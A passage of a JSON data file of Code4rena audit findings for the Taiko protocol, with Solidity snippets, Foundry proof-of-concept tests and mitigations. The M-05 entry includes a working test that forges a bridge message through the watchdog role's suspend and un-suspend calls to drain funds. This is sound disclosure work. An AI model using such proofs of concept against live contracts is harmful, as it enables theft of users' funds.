      "summary": "\nThe `GuardianProver` contract has a vulnerability where the last guardian can decide whether or not to return the liveness bond to the assigned prover. This is because the approved message does not include the `_proof` and the data from the `_proof` is used to determine the return of the bond. To fix this, the `_proof` should be included in the approved message.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/205",
      "tags": [],
      "finders": [
        "alexfilippov314",
        "t0x1c"
      ]
    },
    {
      "id": "31942",
      "title": "[M-09] LibProposing:proposeBlock allows blocks with a zero parentMetaHash to be proposed after the genesis block and avoid parent block verification",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibProposing.sol#L108> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibProposing.sol#L213> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibProving.sol#L121>\n\nThe proposeBlock at the LibProposing library has the following check to ensure the proposed block has the correct parentMetaHash set:\n\n```solidity\nfunction proposeBlock(\n        TaikoData.State storage _state,\n        TaikoData.Config memory _config,\n        IAddressResolver _resolver,\n        bytes calldata _data,\n        bytes calldata _txList\n    )\n        internal\n        returns (TaikoData.BlockMetadata memory meta_, TaikoData.EthDeposit[] memory deposits_)\n    {\n    ...\nif (params.parentMetaHash != 0 && parentMetaHash != params.parentMetaHash) {\n            revert L1_UNEXPECTED_PARENT();\n        }\n    ...\n    }\n```\n\nHowever, there are no sanity checks to ensure params.parentMetaHash is not zero outside of the genesis block.\n\n### Impact\n\nMalicious proposers can propose new blocks without any parentMetaHash.\nThis can induce a maliciously-generated block to be artificially contested as the final block relies on data held by the meta\\_ variable.\nSnippet 1:\n\n```solidity\nTaikoData.Block memory blk = TaikoData.Block({\n            metaHash: keccak256(abi.encode(meta_)),\n...\n})\n```\n\nThis also generates issues for independent provers, as they may not utilize the proposed block's data to attempt to prove it and utilize the correct parentMetaHash, which will make the LibProving:proveBlock call revert with an L1\\_BLOCK_MISTATCH error:\n\n```solidity\nfunction proveBlock\n\t...\n\tif (blk.blockId != _meta.id || blk.metaHash != keccak256(abi.encode(_meta))) {\n            revert L1_BLOCK_MISMATCH();\n        }\n\t...\n}\n```\n\nAlso, according to the documentation, [ If the parent block hash is incorrect, the winning transition won't be used for block verification, and the prover will forfeit their validity bond entirely.](https://taiko.mirror.xyz/Z4I5ZhreGkyfdaL5I9P0Rj0DNX4zaWFmcws-0CVMJ2A#:\\~:text=If%20the%20parent%20block%20hash%20is%20incorrect%2C%20the%20winning%20transition%20won%27t%20be%20used%20for%20block%20verification%2C%20and%20the%20prover%20will%20forfeit%20their%20validity%20bond%20entirely) If a maliciously proposed block with zero parent block hash is contested and a higher-tier prover ends up proving the proposed block, then he/she loses its own validity bond.\n\n### Proof of Concept\n\nThe test suite contains the TaikoL1TestBase:proposeBlock that creates new block proposals with a zero parentMetaHash. This is called multiple times at tests like test_L1\\_verifying_multiple_blocks_once and test_L1\\_multiple_blocks_in_one_L1\\_block at the TaikoL1.t.sol test file, demonstrating the lack of reversion if the parentMetaHash is not zero outside of the genesis block.\n\n### Recommended Mitigation Steps\n\nMake sure to check the parentMetaHash value is not zero if it isn't at the genesis block, otherwise users are going to be able to wrongly induce contestations.\n\n**[adaki2004 (Taiko) confirmed](https://github.com/code-423n4/2024-03-taiko-findings/issues/218#issuecomment-2033993978)**\n\n***\n\n",
      "summary": "\nThe bug report is about a potential issue in the proposeBlock function of the LibProposing library. This function is used to propose new blocks in the Taiko protocol. The function has a check to ensure that the proposed block has the correct parentMetaHash set, but this check is only applied to blocks outside of the genesis block. This means that malicious users can propose new blocks without any parentMetaHash, which can cause problems for independent provers and potentially lead to the loss of their validity bond. The bug has been demonstrated in the test suite and the recommended mitigation step is to check that the parentMetaHash is not zero if it is not at the genesis block.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/218",
      "tags": [],
      "finders": [
        "joaovwfreire"
      ]
    },
    {
      "id": "31941",
      "title": "[M-08] Bridged tokens would be lost if sender and receiver are contracts that don't implement fallback/receive",
      "impact": "MEDIUM",
      "content": "\nWhen a bridged token is received on the dest chain, `ERC20Vault.onMessageInvocation()` is being called.\n`onMessageInvocation()` always calls `to.sendEther(msg.value)` even when the `msg.value` is zero.\n`sendEther()` would attempt to call the contract with the value supplied and empty data. If the `to` address ia a contract that doesn't implement neither the fallback function nor receive then the entire transaction would revert.\n\nThe same issue occurs during recalling the message, if the sender is also a contract that doesn't implement neither a fallback nor receive then the recalling would fail as well.\n\n### Impact\n\nFunds would be lost, since the sending can't be finalized and recovering would revert as well.\n\nWhile this might be considered a user error when sending a value that's greater than zero (they should've checked that the `to` address implements the receiver), this can't be said about the case where the value is zero - the user won't expect the vault to call the `to` contract with zero value.\n\n### Proof of Concept\n\nAdd the following PoC to `test\\tokenvault\\ERC20Vault.t.sol`:\n\n<details>\n<summary>Coded PoC</summary>\n\n```solidity\ncontract NoFallback{\n    // other functions might be implemented here, but neither a fallback nor receive\n}\n```\n\n<details>\n\n```solidity\n    function test_noFallback()\n        public\n    {\n        vm.startPrank(Alice);\n\n        vm.chainId(destChainId);\n\n        erc20.mint(address(erc20Vault));\n\n        uint256 amount = 0;\n        address to = address(new NoFallback());\n\n        uint256 erc20VaultBalanceBefore = erc20.balanceOf(address(erc20Vault));\n        uint256 toBalanceBefore = erc20.balanceOf(to);\n\n        destChainIdBridge.sendReceiveERC20ToERC20Vault(\n            erc20ToCanonicalERC20(destChainId),\n            Alice,\n            to,\n            amount,\n            bytes32(0),\n            address(erc20Vault),\n            srcChainId,\n            0\n        );\n\n        uint256 erc20VaultBalanceAfter = erc20.balanceOf(address(erc20Vault));\n        assertEq(erc20VaultBalanceBefore - erc20VaultBalanceAfter, amount);\n\n        uint256 toBalanceAfter = erc20.balanceOf(to);\n        assertEq(toBalanceAfter - toBalanceBefore, amount);\n    }\n\n    function test_20Vault_onMessageRecalled_20() public {\n        Alice = address(new NoFallback());\n        erc20.mint(Alice);\n\n        vm.startPrank(Alice);\n\n        uint256 amount = 2 wei;\n        erc20.approve(address(erc20Vault), amount);\n\n        uint256 aliceBalanceBefore = erc20.balanceOf(Alice);\n        uint256 erc20VaultBalanceBefore = erc20.balanceOf(address(erc20Vault));\n\n        IBridge.Message memory _messageToSimulateFail = erc20Vault.sendToken(\n            ERC20Vault.BridgeTransferOp(\n                destChainId, address(0), Bob, address(erc20), amount, 1_000_000, 0, Bob, \"\"\n            )\n        );\n\n        uint256 aliceBalanceAfter = erc20.balanceOf(Alice);\n        uint256 erc20VaultBalanceAfter = erc20.balanceOf(address(erc20Vault));\n\n        assertEq(aliceBalanceBefore - aliceBalanceAfter, amount);\n        assertEq(erc20VaultBalanceAfter - erc20VaultBalanceBefore, amount);\n\n        // No need to imitate that it is failed because we have a mock SignalService\n        bridge.recallMessage(_messageToSimulateFail, bytes(\"\"));\n\n        uint256 aliceBalanceAfterRecall = erc20.balanceOf(Alice);\n        uint256 erc20VaultBalanceAfterRecall = erc20.balanceOf(address(erc20Vault));\n\n        // Release -> original balance\n        assertEq(aliceBalanceAfterRecall, aliceBalanceBefore);\n        assertEq(erc20VaultBalanceAfterRecall, erc20VaultBalanceBefore);\n    }\n```\n</details>\n\nOutput:\n\n```\n\nFailing tests:\nEncountered 1 failing test in test/tokenvault/ERC20Vault.t.sol:TestERC20Vault\n[FAIL. Reason: ETH_TRANSFER_FAILED()] test_20Vault_receive_erc20_canonical_to_dest_chain_transfers_from_canonical_token() (gas: 201153)\n\n\nFailing tests:\nEncountered 1 failing test in test/tokenvault/ERC20Vault.t.sol:TestERC20Vault\n[FAIL. Reason: ETH_TRANSFER_FAILED()] test_20Vault_onMessageRecalled_20()\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\n*   Don't call `sendEther()` when the value is zero\n    *   Or modify `sendEther()` to return when the value is zero\n*   Find a solution for cases when the value is non-zero\n    *   This one is a bit more complicated, one way might be to allow the sender to request the ERC20 token while giving up on the ETH\n\n\n**[dantaik (Taiko) confirmed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/226#issuecomment-2079065682):**\n > We have change the sendEther function such that if the amount is 0, there is no further action and the sendEther function simply returns.\n >\n >If if default and receive functions are both unimplemented on the destination chain for the to address, then the owner can fail the message with retryMessage({..., _lastAttemp=true}); >or use failMessage(...) , then on the source chain, the owner can call recallMessage to get back his tokens.\n >\n >At the end of the day, the user must trust the dapp that use our Bridge to set the right message parameters.\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue where a contract function, `ERC20Vault.onMessageInvocation()`, is always calling another function, `sendEther()`, even when the value being sent is zero. This can cause problems when the receiving contract does not implement a fallback or receive function, resulting in the entire transaction being reverted. This can lead to loss of funds and is considered a serious issue. The report includes a proof of concept and recommends steps to mitigate the issue, such as not calling `sendEther()` when the value is zero and finding a solution for non-zero values. The issue has been confirmed and commented on by the team, who have made changes to the `sendEther()` function to address the issue. They also suggest using the `retryMessage()` or `failMessage()` functions to handle cases where the receiving contract does not have the necessary functions implemented. Ultimately, it is important for users to trust the dapp using the Bridge and ensure the message parameters are set correctly. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/226",
      "tags": [],
      "finders": [
        "Shield"
      ]
    },
    {
      "id": "31940",
      "title": "[M-07] Incorrect __Essential_init() function is used in TaikoToken making snapshooter devoid of calling snapshot()",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/TaikoToken.sol#L34> <br><https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/TaikoToken.sol#L52>\n\nThe EssentialContract.sol contract is inherited by the TaikoToken contract. This essential contract contains two \\__Essential_init() functions, one with an owner parameter only (see [here](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/common/EssentialContract.sol#L109)) and the other with owner and address manager parameters (see [here](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/common/EssentialContract.sol#L95)).\n\nThe issue with the current code is that it uses the [\\__Essential_init()](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/common/EssentialContract.sol#L109) function with the owner parameter only. This would cause the [onlyFromOwnerOrNamed(\"snapshooter\")](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/TaikoToken.sol#L52) modifier on the [snapshot](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/TaikoToken.sol#L52) function to not be able to resolve the snapshooter role since the address manager contract was never set during initialization, thus causing a revert.\n\nDue to this:\n\n1.  Snapshooter role is denied from taking snapshots.\n2.  Timely snapshots for certain periods could have failed by the snapshooter since they would have required the owner to jump in by the time the issue was realized.\n3.  Correct/Intended functionality of the protocol is affected i.e. the snapshooter role assigned to an address cannot ever perform its tasks validly.\n\n### Proof of Concept\n\nHere is the whole process:\n\n1.  Snapshooter address calls the [snapshot()](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/TaikoToken.sol#L52) function. The [onlyFromOwnerOrNamed(\"snapshooter\")](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/TaikoToken.sol#L52) modifier is encountered first.\n\n```solidity\nFile: TaikoToken.sol\n57:     function snapshot() public onlyFromOwnerOrNamed(\"snapshooter\") {\n58:         _snapshot();\n59:     }\n```\n\n2.  In the second condition, the [modifier](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/common/EssentialContract.sol#L41) calls the [resolve()](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/common/AddressResolver.sol#L30) function with the \"snapshooter\" role as `_name` in order to check if the caller (msg.sender) is indeed the address approved by the owner.\n\n```solidity\nFile: EssentialContract.sol\n46:     modifier onlyFromOwnerOrNamed(bytes32 _name) {\n47:         if (msg.sender != owner() && msg.sender != resolve(_name, true))\n48:             revert RESOLVER_DENIED();\n49:         _;\n50:     }\n```\n\n3.  The [resolve()](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/common/AddressResolver.sol#L30) function is called which internally calls the function [\\_resolve()](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/common/AddressResolver.sol#L72). In the function \\_resolve(), the condition on Line 69 evaluates to true and we revert. This is because the addressManager address was never set during initialization using the [\\__Essential_init()](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/common/EssentialContract.sol#L95) function with the owner and address manager parameters. Due to this, the snapshooter address is denied from performing it's allocated tasks.\n\n```solidity\nFile: AddressResolver.sol\n64:     function _resolve(\n65:         uint64 _chainId,\n66:         bytes32 _name,\n67:         bool _allowZeroAddress\n68:     ) private view returns (address payable addr_) {\n69:         if (addressManager == address(0)) revert RESOLVER_INVALID_MANAGER();\n70: \n71:         addr_ = payable(\n72:             IAddressManager(addressManager).getAddress(_chainId, _name)\n73:         );\n74: \n75:         if (!_allowZeroAddress && addr_ == address(0)) {\n76:             revert RESOLVER_ZERO_ADDR(_chainId, _name);\n77:         }\n78:     }\n```\n\n### Recommended Mitigation Steps\n\nIn the [init()](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/TaikoToken.sol#L25) function, consider using the [\\__Essential_init()](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/common/EssentialContract.sol#L95) function with the owner and address manager parameters instead of the [\\__Essential_init()](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/common/EssentialContract.sol#L109) function with the owner parameter. This would allow the snapshooter address to proceed with taking snapshots as expected.\n\n\n**[dantaik (Taiko) confirmed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/261#issuecomment-2031678339):**\n > This is a valid bug report. The bug is fixed by https://github.com/taikoxyz/taiko-mono/commit/c64ec193c95113a4c33692289e23e8d9fa864073\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the code for the TaikoToken contract, which is used for a protocol. The problem is that the code is using a function that only requires an \"owner\" parameter instead of a function that requires both an \"owner\" and \"address manager\" parameter. This causes a modifier (a type of function) to not work properly, which means that certain tasks cannot be performed correctly. This could have caused issues with taking snapshots and affected the functionality of the protocol. The report recommends using a different function to fix the problem. The bug has been confirmed and fixed by the team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/261",
      "tags": [],
      "finders": [
        "Limbooo",
        "MrPotatoMagic",
        "t0x1c",
        "imare"
      ]
    },
    {
      "id": "31939",
      "title": "[M-06] First block proposer check in the `LibProposing._isProposerPermitted` function is errorneous",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibProposing.sol#L93-L94> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibProposing.sol#L299-L317>\n\nThe `LibProposing.proposeBlock` function calls the `_isProposerPermitted` private function, to ensure if the `proposer is set`. Only that specific address has the permission to propose the block.\n\nIn the `_isProposerPermitted` function, for the first block after the genesis block only the `proposerOne` is allowed to propose the first block as shown below:\n\n```solidity\n            address proposerOne = _resolver.resolve(\"proposer_one\", true);\n            if (proposerOne != address(0) && msg.sender != proposerOne) {\n                return false;\n            }\n```\n\nBut the issue here is that when the `msg.sender == proposerOne` the function `does not return true` if the following conditions occur.\n\nIf the `proposer != address(0) && msg.sender != proposer`. In which case even though the `msg.sender == proposerOne` is `true` for the first block the `_isProposerPermitted` will still return `false` thus reverting the block proposer for the first block.\n\nHence even though the `proposer_one` is the proposer of the first block the transaction will still revert if the above mentioned conditions occur and the `_isProposerPermitted` returns `false` for the first block after the genesis block.\n\nHence this will break the block proposing logic since the proposal of the first block after the genesis block reverts thus not allowing subsequent blocks to be proposed.\n\n### Proof of Concept\n\n```solidity\n        TaikoData.SlotB memory b = _state.slotB;\n        if (!_isProposerPermitted(b, _resolver)) revert L1_UNAUTHORIZED();\n```\n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibProposing.sol#L93-L94>\n\n```solidity\n    function _isProposerPermitted(\n        TaikoData.SlotB memory _slotB,\n        IAddressResolver _resolver\n    )\n        private\n        view\n        returns (bool)\n    {\n        if (_slotB.numBlocks == 1) {\n            // Only proposer_one can propose the first block after genesis\n            address proposerOne = _resolver.resolve(\"proposer_one\", true);\n            if (proposerOne != address(0) && msg.sender != proposerOne) {\n                return false;\n            }\n        }\n\n        address proposer = _resolver.resolve(\"proposer\", true);\n        return proposer == address(0) || msg.sender == proposer;\n    }\n```\n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibProposing.sol#L299-L317>\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nIt is recommended to add logic in the `LibProposing._isProposerPermitted` function to `return true` when the `msg.sender == proposerOne`, for proposing the first block after genesis block.\n\n\n**[dantaik (Taiko) confirmed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/274#issuecomment-2031595523):**\n > I think this is a valid bug: fixing it [here](https://github.com/taikoxyz/taiko-mono/pull/16605) \n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the `LibProposing.proposeBlock` function in the Taiko protocol. The function calls a private function, `_isProposerPermitted`, to ensure that only a specific address (the proposer) has permission to propose a block. However, there is a problem when the `msg.sender` is equal to the `proposerOne` address. In this case, the `_isProposerPermitted` function does not return `true` if certain conditions are met, causing the block proposal to fail. This can break the block proposing logic and prevent subsequent blocks from being proposed. The recommended mitigation step is to add logic to the `_isProposerPermitted` function to return `true` when `msg.sender` is equal to `proposerOne` for the first block after the genesis block. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/274",
      "tags": [],
      "finders": [
        "Shield",
        "blockdev",
        "monrel"
      ]
    },
    {
      "id": "31938",
      "title": "[M-05] Bridge watcher can forge arbitrary message and drain bridge",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/bridge/Bridge.sol#L82-L95> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/bridge/Bridge.sol#L230-L231>\n\nThe `bridge_watchdog` role can forge arbitrary messages and drain the bridge of all ETH and tokens.\n\n### Proof of Concept\n\n`bridge_watchdog` can call `suspendMessasges()` to suspend and un-suspend a message\n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/bridge/Bridge.sol#L82-L95>\n\n```solidity\n    function suspendMessages(\n        bytes32[] calldata _msgHashes,\n        bool _suspend\n    )\n        external\n        onlyFromOwnerOrNamed(\"bridge_watchdog\")\n    {\n        uint64 _timestamp = _suspend ? type(uint64).max : uint64(block.timestamp);\n        for (uint256 i; i < _msgHashes.length; ++i) {\n            bytes32 msgHash = _msgHashes[i];\n            proofReceipt[msgHash].receivedAt = _timestamp;\n            emit MessageSuspended(msgHash, _suspend);\n        }\n    }\n```\n\nWhen this function is called to un-suspend a message we set `proofReceipt[msgHash] = _timestamp`. If the msgHash was not proven before it will now be treated as proven since any `msgHash` with a `timestamp != 0` is treated as proven\n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/bridge/Bridge.sol#L230-L231>\n\n```solidity\n        uint64 receivedAt = proofReceipt[msgHash].receivedAt;\n        bool isMessageProven = receivedAt != 0\n```\n\n`bridge_watchdog` can therefore forge arbitrary messages and have them treated as proven by first suspending them and then un-suspending them.\n\n`bride_watchdog` is supposed to only be able to ban and suspend messages, in the expected worst case `bridge_watchdog` is limited to DDOSing messages and bans until governance removes the the `bridge_watchdog`.\n\nWith the privilege escalation shown here the role can instead drain the bridge of all ETH and tokens.\n\n### POC\n\nHere is a POC showing that we can forge an arbitrary message by suspending and un-suspending a message\n\nTo run this POC first change the following code in Bridge.t.sol so that we use a real signalService\n\n```diff\nregister(\n+address(addressManager), \"signal_service\", address(signalService), destChainId \n-address(addressManager), \"signal_service\", address(mockProofSignalService), destChainId \n);\n```\n\nPaste the below code and run into Bridge.t.sol and run `forge test --match-test testWatchdogDrain -vvv`\n\n<details>\n\n```solidity\n    function testWatchdogDrain() public {\n        uint256 balanceBefore = Bob.balance;\n        IBridge.Message memory message = IBridge.Message({\n            id: 0,\n            from: address(bridge),\n            srcChainId: uint64(block.chainid),\n            destChainId: destChainId,\n            srcOwner: Alice,\n            destOwner: Alice,\n            to: Bob,\n            refundTo: Alice,\n            value: 10 ether,\n            fee: 1,\n            gasLimit: 1_000_000,\n            data: \"\",\n            memo: \"\"\n        });\n\n\n        bytes memory proof = hex\"00\";\n        bytes32 msgHash = destChainBridge.hashMessage(message);\n        \n        bytes32[] memory msgHashA = new bytes32[](1); \n        msgHashA[0] = msgHash;\n\n        vm.prank(Alice); \n        destChainBridge.suspendMessages(msgHashA, true); \n\n        vm.prank(Alice);\n        destChainBridge.suspendMessages(msgHashA, false); \n\n        vm.chainId(destChainId);\n        vm.prank(Bob, Bob);\n\n        destChainBridge.processMessage(message, proof);\n\n        IBridge.Status status = destChainBridge.messageStatus(msgHash);\n\n        assertEq(status == IBridge.Status.DONE, true);\n        console2.log(\"Bobs Stolen funds\", Bob.balance-balanceBefore);\n        \n        console2.log(\"We have successfully processed a message without actually proving it!\");\n    }\n\n```\n\n</details>\n\n### Tools Used\n\nFoundry, VScode\n\n### Recommended Mitigation Steps\n\nUn-suspended messages should be set to 0 and be proven or re-proven.\n\n```diff\n    function suspendMessages(\n        bytes32[] calldata _msgHashes,\n        bool _suspend\n    )\n        external\n        onlyFromOwnerOrNamed(\"bridge_watchdog\")\n    {\n+       uint64 _timestamp = _suspend ? type(uint64).max : 0;\n        for (uint256 i; i < _msgHashes.length; ++i) {\n            bytes32 msgHash = _msgHashes[i];\n            proofReceipt[msgHash].receivedAt = _timestamp;\n            emit MessageSuspended(msgHash, _suspend);\n        }\n    }\n```\n**[dantaik (Taiko) confirmed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/278#issuecomment-2031031880):**\n > This is a valid bug report. The bug has been fixed in this PR: https://github.com/taikoxyz/taiko-mono/pull/16545\n\n\n**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/278#issuecomment-2045135078):**\n > Good report, but I am not sure it qualifies as H severity and most likely should be M. \n> \n> I think there is a pre-condition here (a malicious watchdog). \n> \n> > 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n>\n> Agree that if this attack is feasible, it represents privilege escalation. \n> \n> As pointed out previously:\n> \n> > Privilege escalation issues are judged by likelihood and impact and their severity is uncapped.\n\n_Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-taiko-findings/issues/278)._\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the Bridge.sol contract of the Taiko project. The `bridge_watchdog` role has the ability to forge arbitrary messages and drain the bridge of all ETH and tokens. This can be done by calling the `suspendMessages()` function to suspend and un-suspend messages, which will then be treated as proven. This gives the `bridge_watchdog` the power to steal funds. The bug has been fixed by setting un-suspended messages to 0 and requiring them to be proven or re-proven. The severity of this bug has been decreased from high to medium, as it requires a malicious `bridge_watchdog` and has a hypothetical attack path.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/278",
      "tags": [],
      "finders": [
        "josephdara",
        "Shield",
        "monrel",
        "t0x1c"
      ]
    },
    {
      "id": "31937",
      "title": "[M-04] A recalled ERC20 bridge transfer can lock tokens in the bridge",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/tokenvault/ERC20Vault.sol#L320-L335> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/tokenvault/adapters/USDCAdapter.sol#L43-L45> \n\n<https://github.com/circlefin/stablecoin-evm/blob/0828084aec860712531e8d79fde478927a34b3f4/contracts/v1/FiatTokenV1.sol#L133-L136>\n\nA recalling ERC20 bridge transfer can lock funds in the bridge if the call to mint tokens fail on the source chain. Depending on the Native token logic this could either be a permanent lock or a lock of an unknown period of time.\n\nExample of how this can happen with the provided USDCAdapter:\n\nUSDC limits the amount of USDC that can be minted on each chain by giving each minter a minting allowance. If the minting allowance is reach minting will revert. If this happens in a recalled message the tokens together with the ETH value is locked.\n\n### Proof of Concept\n\nUSDC limits the amount of USDC that can be minted on each chain by giving each minter a minting allowance.\n\nIf `_amount <= mintingAllowedAmount` is reached for the `USDCAdapter` tokens can not be minted but since this is a recalled message the funds are stuck.\n\nBoth `onMessageIncovation()` and `onMessageRecalled()` call `_transferToken()` to either mint or release tokens.\n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/tokenvault/ERC20Vault.sol#L320-L335>\n\n```solidity\n    function _transferTokens(\n        CanonicalERC20 memory _ctoken,\n        address _to,\n        uint256 _amount\n    )\n        private\n        returns (address token_)\n    {\n        if (_ctoken.chainId == block.chainid) {\n            token_ = _ctoken.addr;\n            IERC20(token_).safeTransfer(_to, _amount);\n        } else {\n            token_ = _getOrDeployBridgedToken(_ctoken);\n            IBridgedERC20(token_).mint(_to, _amount);\n        }\n    }\n```\n\nA recalled message to bridge USDC L1->L2 will revert when we attempt to mint through the `USDCAdapter`\n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/tokenvault/adapters/USDCAdapter.sol#L43-L45>\n\n```solidity\n    function _mintToken(address _account, uint256 _amount) internal override {\n        usdc.mint(_account, _amount);\n    \n```\n\nOn the following condition in the native USDC contract\n\n<https://github.com/circlefin/stablecoin-evm/blob/0828084aec860712531e8d79fde478927a34b3f4/contracts/v1/FiatTokenV1.sol#L133-L136>\n\n```solidity\n        require(\n            _amount <= mintingAllowedAmount,\n            \"FiatToken: mint amount exceeds minterAllowance\"\n        );\n```\n\nCourse of events that ends in locked funds:\n\n1.  User bridges USDC from L2->L1\n2.  The message is recalled from L1\n3.  The USDCAdapter has reached the `mintingAllowedAmount`\n4.  The recalled message is stuck because minting reverts. The USDC and ETH passed in are both locked.\n\n### Tools Used\n\nFoundry, VScode\n\n### Recommended Mitigation Steps\n\nAdd new functionality in the vault that allows users to send a new message to the destination chain again with new message data if `onMessageRecalls()` can not mint tokens. We give users the ability to redeem for canonical tokens instead of being stuck.\n\n\n**[dantaik (Taiko) acknowledged and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/279#issuecomment-2033383461):**\n > Thank you for your feedback. In your example, if the user cannot mint tokens in USDCAdapter by using `recallMessage`, the user can wait and call `recallMessage` again.  That's why recallMessage is _retriable_. \n> \n> There is no perfect solution here, and I personally don't want to make the bridge too complicated by introducing this re-send-another-message feature.\n> \n> Adding a warning on the bridge UI to show a warning message might be a good solution, something like \"USDC on Taiko has reached 95% of its max supply cap, bridging USDC to Taiko may end up your fund becoming unavailable for some time until others bridge USDC away from Taiko\".\n> \n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/279#issuecomment-2049345554):**\n > The sponsor comments simply show their isn't a great solution to the problem, it still represents a loss of user funds (if it goes on forever) or a  denial of service and a risk that users should be aware of. \n> \n> @dontonka / @adaki2004 (Taiko) any last comments here?\n\n**[adaki2004 (Taiko) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/279#issuecomment-2049448918):**\n> We are OK with med, no issue. Please proceed accordinlgy - as we dont have:\n> 1. the perfect solution to the problem\n> 2. the intention to fix it ATM - since we wont be using any native tokens anytime soon.\n> \n> But please proceed the way which is suitable for the wardens better, we appreciate their efforts. (So not questioning the severity)\n\n***\n\n",
